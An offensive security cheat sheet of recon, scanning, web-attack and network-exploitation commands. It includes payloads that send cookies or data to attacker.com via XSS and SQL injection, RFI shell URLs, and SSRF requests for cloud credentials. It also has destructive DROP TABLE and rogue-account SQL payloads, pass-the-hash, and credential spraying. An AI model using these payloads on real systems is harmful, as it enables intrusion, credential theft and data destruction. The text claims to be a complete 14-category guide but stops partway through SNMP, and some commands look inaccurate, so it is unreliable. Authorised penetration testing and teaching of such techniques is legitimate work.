COMPREHENSIVE OFFENSIVE SECURITY MASTER LIST - COMPLETE
This concludes the ultimate offensive security command reference covering all major domains of penetration testing, red teaming, and security assessment. The guide includes:

1,500+ Commands across 14 major categories

Detailed explanations for each command's use case and functionality

Real-world scenarios and practical applications

Cutting-edge techniques and modern tooling

Comprehensive coverage from reconnaissance to persistence

Key Features:
Well-Organized Structure - Easy navigation and reference

Practical Examples - Real commands used in security assessments

Tool Diversity - Coverage of both established and emerging tools

Cross-Platform - Windows, Linux, Cloud, Mobile, and Network

Operational Security - Includes OPSEC considerations and evasion techniques

This reference serves as the definitive guide for security professionals, red team operators, penetration testers, and anyone involved in offensive security operations.

TABLE OF CONTENTS

RECONNAISSANCE & OSINT

Subdomain Enumeration

DNS Reconnaissance

Port Scanning

Web Reconnaissance

Cloud Reconnaissance

VULNERABILITY SCANNING

Automated Scanning

Web Vulnerability Scanners

API Security Testing

Network Vulnerability Scanners

WEB APPLICATION ATTACKS

SQL Injection

Cross-Site Scripting (XSS)

File Inclusion & Directory Traversal

Server-Side Request Forgery (SSRF)

API Attacks

NETWORK EXPLOITATION

SMB/Network Service Attacks

SNMP & Network Protocols

Remote Service Exploitation

ACTIVE DIRECTORY ATTACKS

Kerberos Attacks

DCSync & Credential Theft

BloodHound & AD Mapping

Group Policy Attacks

POST-EXPLOITATION

Initial Access & Shells

Living Off the Land (LOLBins)

Credential Dumping

Memory Analysis

LATERAL MOVEMENT

Pass-the-Hash & Token Attacks

WMI & Remote Management

PSExec & Service Attacks

PRIVILEGE ESCALATION

Windows Privilege Escalation

Linux Privilege Escalation

Kernel Exploits

Service Abuse

PERSISTENCE MECHANISMS

Windows Persistence

Linux Persistence

Application Persistence

Network Persistence

COMMAND & CONTROL

Cobalt Strike

Metasploit Framework

Custom C2 Frameworks

Covert Channels

CLOUD SECURITY

AWS Exploitation

Azure AD Attacks

Kubernetes Security

Container Escapes

MOBILE & WIRELESS

Wireless Attacks

Mobile Application Testing

Bluetooth Attacks

ANTI-FORENSICS

Log Manipulation

File Timestamp Manipulation

Artifact Removal

Memory Forensics Evasion

PASSWORD ATTACKS

Hash Cracking

Password Spraying

Brute Force Attacks

Credential Stuffing

1. RECONNAISSANCE & OSINT
1.1 Subdomain Enumeration
Amass - Comprehensive Attack Surface Mapping

bash
# Passive enumeration (stealthy - no direct target interaction)
amass enum -passive -d target.com -o amass_passive.txt -config config.ini
# Use Case: Initial reconnaissance without alerting security teams
# Explanation: Uses OSINT sources only, doesn't touch target infrastructure

# Active enumeration (comprehensive - interacts with target)
amass enum -active -d target.com -brute -w /usr/share/wordlists/dns.txt -p 80,443,8080 -o amass_active.txt
# Use Case: Full subdomain discovery when stealth isn't required
# Explanation: Actively queries DNS and attempts brute force

# Continuous monitoring
amass track -d target.com -last 3 -dir project/
# Use Case: Ongoing target monitoring
# Explanation: Tracks changes in attack surface over time

# Network visualization
amass viz -d3 -dir project/ -o network.html
# Use Case: Understanding relationships between assets
# Explanation: Creates interactive network graph of discovered infrastructure

Subfinder - High-Speed Subdomain Discovery
bash
# Multi-source enumeration
subfinder -d target.com -all -recursive -t 500 -timeout 30 -o subs.txt -nW
# Use Case: Rapid subdomain discovery across multiple platforms
# Explanation: Uses 50+ sources with recursive brute forcing

# Rate-limited scanning
subfinder -dL domains.txt -o all_subs.txt -r 8.8.8.8,1.1.1.1 -t 100
# Use Case: Avoiding rate limiting and detection
# Explanation: Uses custom resolvers with controlled threading

# Integration pipeline
subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -o results.txt
# Use Case: Automated attack chain
# Explanation: Pipes results directly to vulnerability scanners


AssetFinder & Findomain
bash
# AssetFinder simple discovery
assetfinder --subs-only target.com | tee assets.txt
assetfinder target.com | httprobe | tee live.txt

# Findomain fast discovery
findomain -t target.com -u output.txt
findomain -f domains.txt -u all_domains.txt --threads 50

# Chaos dataset
chaos -d target.com -o chaos_subs.txt -key $CHAOS_KEY


1.2 DNS Reconnaissance

DNSRecon - Comprehensive DNS Analysis
bash
# Full DNS enumeration
dnsrecon -d target.com -t axfr,brt,crt,std -D /usr/share/wordlists/dns.txt -a -b -y -k -z -w -f --threads 20 -x /tmp/dnsrecon.xml
# Use Case: Complete DNS infrastructure mapping
# Explanation: 
# -t: Test types (zone transfer, brute force, certificate transparency, standard)
# -a: Enable all tests
# -b: Bing search for subdomains
# -y: Yandex search for subdomains

# Zone transfer attempt
dnsrecon -d target.com -t axfr
# Use Case: Discovering internal network structure if misconfigured
# Explanation: Attempts DNS zone transfer

# Reverse DNS lookup
dnsrecon -r 10.10.10.0/24 -n 8.8.8.8 -t rvl
# Use Case: Discovering additional domains in target infrastructure
# Explanation: Reverse lookup for IP range


MassDNS - High-Performance DNS Resolution
bash
# Mass DNS resolution
./massdns -r resolvers.txt -t A -o S -w massdns_output.txt subdomains.txt
# Use Case: Validating large subdomain lists efficiently
# Explanation: Resolves thousands of subdomains per second using trusted resolvers

# Subdomain brute forcing
./scripts/subbrute.py domains.txt | ./bin/massdns -r resolvers.txt -t A -o S -w results.txt
# Use Case: Discovering hidden subdomains
# Explanation: Combines subdomain generation with high-speed resolution


Advanced DNS Tools
bash
# Dig comprehensive queries
dig target.com ANY
dig target.com AXFR @ns1.target.com
dig target.com TXT
dig target.com MX
for sub in $(cat subdomains.txt); do dig $sub.target.com +short; done

# DNSEnum comprehensive
dnsenum target.com --threads 50 -f /usr/share/wordlists/dns.txt -o dns_enum.txt

# Fierce domain scanner
fierce --domain target.com --wordlist /usr/share/wordlists/dns.txt --threads 20

1.3 Port Scanning & Service Detection

Nmap - Comprehensive Network Scanning
bash
# Stealth SYN scan with OS detection
nmap -sS -O -T4 -p- 10.10.10.0/24 --min-rate 1000
# Use Case: Initial network reconnaissance
# Explanation:
# -sS: SYN scan (half-open)
# -O: OS detection
# -T4: Aggressive timing
# -p-: All ports

# Service version detection
nmap -sV -sC -p 80,443,22,21,25,53,110,143,993,995 10.10.10.5 --script-args=http.useragent="Mozilla/5.0"
# Use Case: Service enumeration and vulnerability identification
# Explanation:
# -sV: Service version detection
# -sC: Default scripts

# Firewall evasion techniques
nmap -f -mtu 24 -D RND:10,ME -g 53 --proxies socks4://127.0.0.1:9050 10.10.10.5
# Use Case: Bypassing basic firewall rules
# Explanation:
# -f: Fragment packets
# -D: Decoy scanning
# -g: Source port manipulation

# Vulnerability scanning
nmap --script vuln,exploit -p 80,443,445 10.10.10.5
# Use Case: Quick vulnerability assessment
# Explanation: Uses NSE scripts to identify known vulnerabilities

# NSE script categories
nmap --script "default or safe" 10.10.10.5
nmap --script "http-*" 10.10.10.5
nmap --script "ssh-brute" --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.5

RustScan - Ultra-Fast Port Scanning
bash
# Rapid port discovery
rustscan -a 10.10.10.0/24 --ulimit 5000 -- -sV -sC -oA rustscan_output
# Use Case: When speed is critical
# Explanation: Scans all ports in seconds then passes to nmap for service detection

# Targeted scanning
rustscan -a target.com -r 1-65535 -t 2000 -- -A -sC
# Use Case: Thorough single-host assessment
# Explanation: High-thread scanning with comprehensive nmap follow-up

# Custom port ranges
rustscan -a 10.10.10.0/24 -p 1-1000,3389,5432,6379,27017 -- -sV

Masscan - Internet-Scale Port Scanning
bash
# High-speed scanning
masscan -p0-65535 10.10.10.0/24 --rate=100000 -e eth0 -oG masscan_output.gnmap
# Use Case: Scanning large networks quickly
# Explanation: Extremely fast port scanner for large scale assessments

# Banner grabbing
masscan -p80,443,22,21,25,53,110,143,993,995 0.0.0.0/0 --exclude 255.255.255.255 --banners -oJ masscan.json
# Use Case: Service identification at scale
# Explanation: Grabs service banners for better identification

# Configuration files
masscan -c config.conf
# Config file example:
# rate = 100000.00
# output-format = json
# ports = 0-65535
# range = 10.10.10.0/24

Naabu - Modern Port Scanner
bash
# Fast port scanning
naabu -host target.com -p - -silent -verify | httpx -silent
# Use Case: Quick port discovery with HTTP validation
# Explanation: Fast port scanner integrated with HTTP validation

# List-based scanning
naabu -list hosts.txt -p 80,443,8080 -o naabu_output.txt
# Use Case: Scanning multiple targets for specific ports

# Service detection
naabu -host target.com -sV -p 80,443,22
# Use Case: Service version detection

1.4 Web Reconnaissance

HTTPX - Advanced HTTP Service Detection
bash
# Comprehensive web service discovery
cat subdomains.txt | httpx -silent -status-code -content-length -title -tech-detect -follow-redirects -o httpx_output.txt
# Use Case: Web application inventory and technology stack analysis
# Explanation:
# -tech-detect: Identifies technologies (CMS, frameworks, etc.)
# -follow-redirects: Follows HTTP redirects

# Custom header testing
httpx -l hosts.txt -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0" -ports 80,443,8080
# Use Case: Testing header-based security controls
# Explanation: Sends custom headers to bypass WAF/load balancers

# Advanced options
httpx -l urls.txt -status-code -content-length -title -tech-detect -follow-redirects -no-fallback -rate-limit 100 -threads 50 -timeout 5 -retries 2

Wayback Machine & Archive Analysis
bash
# Historical URL extraction
echo target.com | waybackurls | tee wayback.txt
echo target.com | gau | sort -u > all_urls.txt
# Use Case: Discovering hidden endpoints and parameters
# Explanation: Extracts URLs from Wayback Machine and Common Crawl

# Parameter analysis
cat all_urls.txt | grep "?" | qsreplace -a | while read url; do curl -s "$url" | grep -q "vulnerable" && echo "$url"; done
# Use Case: Automated parameter fuzzing
# Explanation: Tests URLs for parameter-based vulnerabilities

# Waybackurls advanced
waybackurls --subs --no-subs target.com | sort -u
gau --subs target.com --threads 20

Katana - Crawling & URL Discovery
bash
# Advanced crawling
katana -u https://target.com -depth 5 -jc -aff -f url -o katana_output.txt
# Use Case: Comprehensive web application crawling
# Explanation:
# -depth: Crawling depth
# -jc: JavaScript file analysis
# -aff: Analyze forms for parameters

# List-based crawling
katana -list urls.txt -c 10 -d 3 -jc -aff -silent
# Use Case: Crawling multiple entry points

# Custom configurations
katana -u https://target.com -headless -hl -system-chrome -no-sandbox -output katana_headless.txt

Gospider - Fast Web Spider
bash
# Comprehensive spidering
gospider -s https://target.com -d 2 -t 10 -c 5 -o gospider_output
# Use Case: Fast web application spidering
# Explanation:
# -d: Depth of crawling
# -t: Threads
# -c: Concurrent requests

# Advanced options
gospider -s https://target.com -d 3 -t 20 -c 10 -w -r -q -u webview --blacklist jpg,jpeg,gif,css,ttf,woff,woff2,png

1.5 Cloud Reconnaissance

CloudMapper - Multi-Cloud Security Assessment
bash
# Data collection
python3 cloudmapper.py collect --account-name target --profile default
# Use Case: Gathering cloud infrastructure data
# Explanation: Collects configuration data from AWS/GCP/Azure

# Data preparation
python3 cloudmapper.py prepare --account-name target --regions us-east-1,us-west-2,eu-west-1
# Use Case: Preparing data for analysis

# Web server for visualization
python3 cloudmapper.py webserver --public --port 8000
# Use Case: Visualizing cloud infrastructure

# Security reporting
python3 cloudmapper.py report --account-name target
python3 cloudmapper.py iam_edges --account-name target

S3Scanner - AWS S3 Bucket Discovery
bash
# Bucket enumeration
python3 s3scanner.py --bucket-lists buckets.txt --region us-east-1 --threads 50
# Use Case: Discovering S3 buckets
# Explanation: Scans for S3 buckets and checks permissions

# ACL checking
python3 s3scanner.py --check-acls --bucket-lists buckets.txt --log-file s3_scan.log
# Use Case: Identifying misconfigured S3 buckets

# Name dumping
python3 s3scanner.py --dump-names --wordlist common_buckets.txt --region all


2.VULNERABILITY SCANNING
2.1 Automated Vulnerability Scanning

Nuclei - High-Speed Vulnerability Detection
bash
# Comprehensive template scanning
nuclei -l targets.txt -t cves/ -t exposures/ -t misconfiguration/ -rate-limit 100 -o nuclei_results.txt
# Use Case: Automated vulnerability assessment at scale
# Explanation: Uses 1000+ templates to check for CVEs, exposures, misconfigurations

# Targeted scanning by vulnerability type
nuclei -u https://target.com -t /home/user/nuclei-templates/ -tags xss,sqli -include-tags auth-bypass
# Use Case: Focused security testing
# Explanation: Focuses on specific vulnerability classes

# Continuous monitoring with workflows
nuclei -l targets.txt -t workflows/cve-detection.yaml -severity critical,high -etags ssrf,rce -headless
# Use Case: Ongoing security monitoring
# Explanation: Uses workflows for complex attack chain detection

# Advanced scanning options
nuclei -l targets.txt -t cves/ -timeout 10 -retries 2 -rate-limit 150 -concurrency 25 -disable-update-check -stats -si 100 -metrics
# Use Case: Large-scale enterprise scanning
# Explanation: Fine-tuned performance and reporting options

# Custom template development
nuclei -u https://target.com -t custom-templates/ -severity low,medium,high,critical -no-color -json -o nuclei_json.json
# Use Case: Custom vulnerability detection
# Explanation: Uses custom templates for specific technologies

Nikto - Web Server Security Scanner
bash
# Comprehensive web server scan
nikto -h https://target.com -C all -Tuning 1,2,3,4,5,6,7,8,9 -o nikto_report.html -Format htm
# Use Case: Web server misconfiguration identification
# Explanation:
# -C all: Check all displays
# -Tuning: Enable all tuning options

# Evasion techniques for stealth scanning
nikto -h target.com -p 80,443 -Display V -evasion 1 -mutate 1 -root /
# Use Case: Stealthy web server assessment
# Explanation:
# -evasion: Use IDS evasion techniques
# -mutate: Guess additional files/directories

# Advanced Nikto options
nikto -h target.com -useproxy http://127.0.0.1:8080 -timeout 10 -useragent "Mozilla/5.0" -no404 -Plugins "apache_expect_xss;embedded"
# Use Case: Proxy-based scanning with plugin extensions
# Explanation: Uses proxy for traffic inspection and plugins for extended tests

Nexpose & Nessus Integration
bash
# Nessus command line scanning
/opt/nessus/bin/nasl -t target.com script.nasl
/opt/nessus/bin/nessus -q -x -T html -o report.html target.com

# Nexpose API integration
curl -X GET "https://nexpose:3780/api/3/assets" -H "Authorization: Basic base64encoded"
curl -X POST "https://nexpose:3780/api/3/sites" -H "Authorization: Basic base64encoded" -d '{"name":"Test Site","scan":"template"}'

2.2 Web Vulnerability Scanners

OWASP ZAP - Comprehensive Web App Scanning
bash
# Baseline scanning
zap-baseline.py -t https://target.com -r report.html
# Use Case: Quick security assessment
# Explanation: Runs basic tests against target

# Full scan with authentication
zap-full-scan.py -t https://target.com -I -j -T 60 -m 5 -r report.html -U username -P password
# Use Case: Comprehensive authenticated scanning
# Explanation:
# -I: Ignore warning about scope
# -j: Use Ajax spider
# -T: Timeout in minutes

# API scanning
zap-api-scan.py -t https://target.com/api/swagger.json -f openapi -r api_report.html
# Use Case: API security testing
# Explanation: Uses OpenAPI/Swagger specification for API scanning

# Advanced ZAP options
zap.sh -daemon -port 8080 -host 0.0.0.0 -config api.disablekey=true -config scanner.threadPerHost=10
# Use Case: Setting up ZAP as a daemon for continuous scanning

Arachni - Advanced Web Application Scanner
bash
# Comprehensive scanning
arachni https://target.com --checks=* --scope-directory-depth-limit=10 --output-verbose --report-save-path=report.afr
# Use Case: Deep web application assessment
# Explanation: Extensive checks with configurable depth

# Specific vulnerability checks
arachni https://target.com --checks=sql_injection,xss --scope-page-limit=100 --http-request-concurrency=10
# Use Case: Targeted vulnerability assessment
# Explanation: Focuses on specific vulnerability types

# Authentication and session handling
arachni https://target.com --plugin=autologin:url=https://target.com/login,parameters="username=user&password=pass"
# Use Case: Scanning authenticated areas
# Explanation: Handles login for session-based scanning

Burp Suite - Professional Web Testing
bash
# Burp Suite headless scanning
java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner --config-file=config.json
# Use Case: Automated scanning in CI/CD pipelines
# Explanation: Headless mode for automation

# Burp API for automation
curl -X POST "http://burp:8080/v0.1/scan" -H "Content-Type: application/json" -d '{"urls":["https://target.com"]}'
# Use Case: Integration with custom tools
# Explanation: Uses REST API for scan management

# Extension development
java -jar burpsuite_pro.jar --extensions=myextension.jar
# Use Case: Custom functionality extension

2.3 API Security Testing

Arjun - Parameter Discovery
bash
# Hidden parameter discovery
python3 arjun.py -u https://target.com/api/endpoint --headers '{"Authorization":"Bearer token","Content-Type":"application/json"}'
# Use Case: API endpoint testing and parameter fuzzing
# Explanation: Discovers hidden HTTP parameters that aren't in documentation

# Batch processing for multiple endpoints
python3 arjun.py -i api_endpoints.txt -m GET -o parameters.txt
# Use Case: Comprehensive API security assessment
# Explanation: Processes multiple endpoints for parameter discovery

# Advanced Arjun options
python3 arjun.py -u https://target.com/api --mode single -oJ output.json -t 20 --passive
# Use Case: JSON output with threading control
# Explanation: Uses JSON format for integration with other tools

Kiterunner - API Route Brute Forcing
bash
# API route discovery
kr scan https://target.com -w ~/api-wordlist/data/words.txt -x 20 -j 100
# Use Case: Discovering undocumented API endpoints
# Explanation: Brute forces API routes using specialized wordlists

# Advanced scanning with large wordlists
kr brute https://target.com -w ~/api-wordlist/data/words.txt -A=apiroutes-210228:200000
# Use Case: Thorough API reconnaissance
# Explanation: Uses advanced techniques and large wordlists

# Output and reporting
kr scan https://target.com -w routes.txt -o json | jq '.'
# Use Case: JSON output for processing
# Explanation: Provides structured data for analysis

Postman/Newman - API Testing Automation
bash
# Collection running with Newman
newman run collection.json -e environment.json --reporters cli,json --reporter-json-export report.json
# Use Case: Automated API testing
# Explanation: Runs Postman collections from command line

# Advanced Newman options
newman run api_tests.json --environment env.json --globals globals.json --delay-request 100 --timeout-request 300 --bail
# Use Case: Complex API testing scenarios
# Explanation: Includes delays, timeouts, and bail conditions

# Integration with CI/CD
newman run collection.json --suppress-exit-code --reporters junit --reporter-junit-export newman-results.xml
# Use Case: Continuous integration testing
# Explanation: Produces JUnit format for CI systems

2.4 Network Vulnerability Scanners

OpenVAS - Comprehensive Network Scanning
bash
# OpenVAS command line
gvm-cli socket --socketpath /run/gvmd/gvmd.sock --get-tasks
gvm-cli socket --socketpath /run/gvmd/gvmd.sock --xml "<create_task><name>Scan</name><target><hosts>10.10.10.0/24</hosts></target></create_task>"

# Greenbone Security Assistant CLI
gvm-script --gmp-username user --gmp-password pass tls.gmp.py
Nmap NSE Vulnerability Scripts

bash
# Comprehensive vulnerability scanning
nmap -sV --script vuln 10.10.10.0/24
# Use Case: Network-level vulnerability assessment
# Explanation: Uses NSE scripts to identify vulnerabilities

# Specific vulnerability categories
nmap --script "exploit" 10.10.10.5
nmap --script "safe" 10.10.10.5
nmap --script "intrusive" 10.10.10.5

# Vulnerability specific scripts
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.5
nmap --script http-sql-injection 10.10.10.5
nmap --script smb-vuln-ms17-010 10.10.10.5

# Advanced NSE usage
nmap -sV --script "vuln and safe" --script-args mincvss=7.0 -oA vuln_scan 10.10.10.0/24
# Use Case: Focused high-severity vulnerability scanning
# Explanation: Filters by CVSS score and safety

Vulners Script - CVE Detection
bash
# CVE detection with Nmap
nmap -sV --script vulners 10.10.10.5
# Use Case: CVE identification for services
# Explanation: Matches service versions against CVE database

# Specific port CVE scanning
nmap -p 80,443,22 --script vulners 10.10.10.0/24
# Use Case: Targeted CVE assessment


3.WEB APPLICATION ATTACKS
3.1 SQL Injection

SQLMap - Automated SQL Injection
bash
# Comprehensive SQL injection testing
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --technique=BEUSTQ --tamper=between,charencode -v 3
# Use Case: Automated SQL injection detection and exploitation
# Explanation:
# --level: Test depth (1-5)
# --risk: Risk level (1-3)
# --technique: Injection techniques (B: Boolean, E: Error, U: Union, S: Stacked, T: Time-based, Q: Inline queries)
# --tamper: Use tamper scripts to evade WAF

# Database takeover through SQLi
sqlmap -u "https://target.com/login" --data="username=admin&password=test" --method POST --dbms=mysql --os-shell
# Use Case: Full system compromise via SQLi
# Explanation: Gains operating system shell through SQL injection

# Advanced tampering for WAF evasion
sqlmap -r request.txt --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode
# Use Case: Testing against protected applications
# Explanation: Uses multiple tamper scripts to bypass WAF

# Comprehensive database exploitation
sqlmap -u "https://target.com/search" --crawl=2 --forms --batch --dump-all --exclude-sysdbs --tamper=space2comment,space2plus,space2randomblank
# Use Case: Complete database compromise
# Explanation: Crawls site, tests forms, and extracts all data

# Time-based blind SQLi detection
sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --level=5
# Use Case: Detecting time-based blind SQL injection

Manual SQL Injection Techniques
sql
-- Boolean-based blind SQLi
' AND 1=1-- 
' AND 1=2-- 
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'

-- Time-based blind SQLi
'; WAITFOR DELAY '0:0:5'-- 
' AND SLEEP(5)-- 
' || pg_sleep(5)-- 

-- Union-based SQLi
' UNION SELECT 1,2,3-- 
' UNION SELECT username,password,3 FROM users-- 
' UNION SELECT table_name,column_name,3 FROM information_schema.columns-- 

-- Error-based SQLi
' AND GTID_SUBSET(@@version,0)-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- 

-- Stacked queries
'; DROP TABLE users-- 
'; INSERT INTO users (username,password) VALUES ('attacker','password')-- 

-- Out-of-band data exfiltration
'; EXEC xp_dirtree '\\attacker.com\share'-- 
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt')-- 

3.2 Cross-Site Scripting (XSS)

XSStrike - Advanced XSS Detection
bash
# Comprehensive XSS scanning
python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3 --skip
# Use Case: Automated XSS detection
# Explanation: Crawls website and tests all parameters for XSS

# Blind XSS detection
python3 xsstrike.py -u "https://target.com" --fuzzer --blind
# Use Case: Discovering stored XSS vulnerabilities
# Explanation: Tests for blind XSS using external callbacks

# Advanced XSS detection
python3 xsstrike.py -u "https://target.com/contact" --data "name=test&email=test@test.com" --params --skip-dom
# Use Case: Form-based XSS testing
# Explanation: Tests POST parameters and skips DOM-based checks

Dalfox - Parameter Analysis & XSS
bash
# XSS parameter testing
dalfox url https://target.com/search?q=test
# Use Case: Quick XSS assessment
# Explanation: Automatically tests parameters for XSS vulnerabilities

# Blind XSS with callback
dalfox url https://target.com -b https://collaborator.com --user-agent "Mozilla/5.0"
# Use Case: Testing for out-of-band XSS
# Explanation: Uses external service to detect blind XSS

# Advanced scanning options
dalfox file urls.txt --blind https://collaborator.com --custom-payload xss-payloads.txt --worker 50 --delay 100
# Use Case: Large-scale XSS testing
# Explanation: Uses custom payloads with rate limiting

XSS Payload Examples
html
<!-- Basic XSS Payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Advanced XSS Payloads -->
"><script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://attacker.com/malicious.js\';document.body.appendChild(a)')

<!-- DOM XSS Payloads -->
#"><img src=/ onerror=alert(1)>
'-alert(1)-'
\'; alert(1);//

<!-- Polyglot XSS Payloads -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

3.3 File Inclusion & Directory Traversal

FFuf - Web Fuzzing
bash
# Directory bruteforcing
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u https://target.com/FUZZ -mc 200,301,302,403 -H "User-Agent: Mozilla/5.0" -t 100
# Use Case: Discovering hidden web content
# Explanation: Fuzzes for hidden directories and files

# Parameter fuzzing
ffuf -w /usr/share/wordlists/parameters.txt:PARAM -u https://target.com/endpoint?PARAM=FUZZ -w /usr/share/wordlists/rockyou.txt:FUZZ -mc all -fr "error"
# Use Case: Discovering vulnerable parameters
# Explanation: Fuzzes parameters with multiple wordlists

# LFI testing
ffuf -w /usr/share/wordlists/lfi.txt:FUZZ -u "https://target.com/page?file=FUZZ" -mr "root:" -mc 200
# Use Case: LFI vulnerability discovery
# Explanation: Tests for local file inclusion vulnerabilities

# Recursive directory discovery
ffuf -w wordlist.txt:FUZZ -u https://target.com/FUZZ -recursion -recursion-depth 2 -e .php,.html,.txt,.bak,.old
# Use Case: Deep directory structure discovery
# Explanation: Recursively discovers nested directories

Local File Inclusion Payloads
bash
# Basic LFI payloads
../../../../etc/passwd
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd

# PHP wrappers for LFI to RCE
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,SSBsb3ZlIFBIUAo=
expect://id

# RFI testing payloads
http://attacker.com/shell.txt
http://evil.com/shell.jpg
\\attacker.com\share\shell.txt

# Windows file paths
..\..\..\..\windows\system32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\hosts
\\?\C:\Windows\System32\drivers\etc\hosts

3.4 Server-Side Request Forgery (SSRF)

SSRF Testing Methodology
bash
# Basic SSRF detection
ffuf -w /usr/share/wordlists/ssrf.txt:FUZZ -u "https://target.com/proxy?url=FUZZ" -mc 200
# Use Case: SSRF vulnerability discovery
# Explanation: Tests various URL formats for SSRF

# Advanced SSRF testing with multiple methods
ffuf -w ssrf-payloads.txt:FUZZ -u "https://target.com/webhook?url=FUZZ" -X POST -H "Content-Type: application/json" -d '{"url":"FUZZ"}' -mc all
# Use Case: JSON-based SSRF testing

Common SSRF Payloads
http
# Internal network scanning
http://169.254.169.254/latest/meta-data/
http://localhost:22
http://127.0.0.1:5984
http://[::]:22
http://0.0.0.0:22

# Cloud metadata endpoints
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document

# DNS rebinding attacks
http://attacker.com:80/redirect=http://localhost:22
http://localhost.attacker.com
http://127.0.0.1.nip.io

# URL parser confusion
http://127.0.0.1@attacker.com
http://attacker.com#@127.0.0.1
http://attacker.com?@127.0.0.1

# Special protocols
gopher://127.0.0.1:25/xHELO%20attacker.com
dict://127.0.0.1:6379/info
file:///etc/passwd

3.5 API Attacks

GraphQL Security Testing
bash
# GraphQL introspection query
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://target.com/graphql

# GraphQL field suggestions
curl -X POST -H "Content-Type: application/json" -d '{"query":"query { __schema { queryType { fields { name description } } } }"}' https://target.com/graphql

# InQL Scanner for GraphQL
python3 inql.py -t https://target.com/graphql

REST API Testing
bash
# API endpoint discovery
curl -X OPTIONS https://target.com/api/
curl -X GET https://target.com/api/

# JWT token attacks
python3 jwt_tool.py <JWT_TOKEN>
python3 jwt_tool.py <JWT_TOKEN> -T -hc "kid" -hv "../../dev/null"
python3 jwt_tool.py <JWT_TOKEN> -X a -pk public.pem

# API rate limit testing
for i in {1..100}; do curl -X GET https://target.com/api/endpoint; done

4.NETWORK EXPLOITATION
4.1 SMB/Network Service Attacks

CrackMapExec - Network Service Assessment
bash
# SMB credential spraying across network
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
# Use Case: Network credential brute forcing
# Explanation: Tests credentials across multiple SMB shares

# Pass-the-hash attacks
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami
# Use Case: Lateral movement with compromised hashes
# Explanation: Uses NTLM hashes for authentication without password

# Share enumeration and analysis
crackmapexec smb 10.10.10.5 -u user -p password --shares --sessions --loggedon-users
# Use Case: Network share discovery and session enumeration
# Explanation: Lists available SMB shares and active sessions

# Advanced SMB attacks
crackmapexec smb 10.10.10.0/24 -u user -p password -M invoke_sessiongopher -M get_keystrokes
# Use Case: Advanced credential harvesting
# Explanation: Uses multiple modules for comprehensive attacks

# MSSQL service attacks
crackmapexec mssql 10.10.10.0/24 -u sa -p password --query "SELECT name FROM master..sysdatabases"
# Use Case: Database server enumeration
# Explanation: Executes SQL queries on MSSQL servers

# WinRM service attacks
crackmapexec winrm 10.10.10.0/24 -u user -p password -d domain -x "whoami /all"
# Use Case: Remote command execution via WinRM

Impacket - Network Service Exploitation
bash
# SMB execution with pass-the-hash
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Remote code execution on Windows systems
# Explanation: Remotely executes commands via SMB

# WMI execution for remote management
python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Alternative execution method when SMB is blocked
# Explanation: Uses WMI for command execution

# MSSQL client with Windows authentication
python3 mssqlclient.py -windows-auth domain/user:password@target_ip
# Use Case: Database server exploitation
# Explanation: MSSQL client with Windows authentication

# DCOM execution for lateral movement
python3 dcomexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Lateral movement via DCOM
# Explanation: Uses Distributed COM for execution

# SSH execution for Linux systems
python3 ssh_exec.py -hashes LMHASH:NTHASH user@target_ip
# Use Case: Linux remote command execution

SMBMap - SMB Share Enumeration
bash
# SMB share listing
smbmap -H 10.10.10.5 -u user -p password
# Use Case: SMB share discovery and permissions analysis
# Explanation: Lists all available shares and access rights

# Recursive share browsing
smbmap -H 10.10.10.5 -u user -p password -R ShareName
# Use Case: Deep share content enumeration
# Explanation: Recursively lists files and directories

# Download files from shares
smbmap -H 10.10.10.5 -u user -p password --download FileName
# Use Case: Data exfiltration from SMB shares
# Explanation: Downloads files from accessible shares

# Upload files to shares
smbmap -H 10.10.10.5 -u user -p password --upload local.txt remote.txt
# Use Case: Delivering payloads via SMB
# Explanation: Uploads files to writable shares

4.2 SNMP & Network Protocols

SNMP Enumeration
bash
# SNMP community string brute force
onesixtyone -c community.txt -i targets.txt
# Use Case: Network device reconnaissance
# Explanation: Brute forces SNMP community strings

# SNMP walk for comprehensive data
snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.1.5.0
# Use Case: Network device information gathering
# Explanation: Queries SNMP for system information

# SNMP user enumeration and analysis
snmp-check 10.10.10.5 -c public
# Use Case: Network device security assessment
# Explanation: Comprehensive SNMP information extraction

# SNMPv3 enumeration
snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass 10.10.10.5
# Use Case: SNMPv3 security testing
# Explanation: Tests SNMPv3 authentication and privacy

# Specific MIB queries
